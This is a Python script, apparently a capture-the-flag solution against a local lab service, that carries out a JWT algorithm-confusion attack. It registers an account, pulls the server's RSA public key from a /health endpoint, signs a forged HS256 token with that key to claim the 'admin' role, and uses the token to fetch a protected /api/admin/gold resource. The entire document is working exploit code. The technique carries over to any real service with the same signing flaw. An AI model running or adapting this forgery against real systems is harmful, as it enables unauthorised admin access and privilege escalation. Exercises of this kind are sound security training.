import requests
import base64
import hmac
import hashlib
import json
import time
import random
import string

BASE_URL = "http://localhost:8000"

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge_hs256_jwt(payload, public_key_pem):
    key_bytes = public_key_pem.strip().encode("utf-8")
    
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64url_encode(json.dumps(header, separators=(',', ':')))
    p = b64url_encode(json.dumps(payload, separators=(',', ':')))
    
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    
    return f"{h}.{p}.{b64url_encode(sig)}"

# Register
username = "robber_" + "".join(random.choices(string.ascii_lowercase, k=6))
email = f"{username}@lacasa.ctf"
password = "bella_ciao_123"

print("[*] Registering...")
r = requests.post(f"{BASE_URL}/api/auth/register", json={"email": email, "password": password})
print(f"    Email: {email} | Status: {r.status_code}")

# Login
print("[*] Logging in...")
r = requests.post(f"{BASE_URL}/api/auth/login", json={"email": email, "password": password})
legit_token = r.json()["access_token"]

# Decode payload
parts = legit_token.split('.')
padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
decoded = json.loads(base64.urlsafe_b64decode(padded))
print(f"    Payload: {decoded}")

# Grab public key
print("[*] Fetching public key from /health...")
pubkey_b64 = requests.get(f"{BASE_URL}/health").json()["RTFD"]
public_key = base64.b64decode(pubkey_b64).decode()
print(f"    Got key: {public_key[:40]}...")

# Forge token
print("[*] Forging token...")
forged_payload = {
    "sub": decoded["sub"],
    "email": email,
    "role": "admin",
    "exp": int(time.time()) + 3600,
    "jti": decoded.get("jti", "deadbeef")
}

forged_token = forge_hs256_jwt(forged_payload, public_key)
print(f"    Forged: {forged_token[:40]}...")

# Get the gold
print("\n[*] Requesting the gold...")
r = requests.get(
    f"{BASE_URL}/api/admin/gold",
    headers={"Authorization": f"Bearer {forged_token}"}
)
print(f"    Status: {r.status_code}")
print(f"    Raw: {r.text}")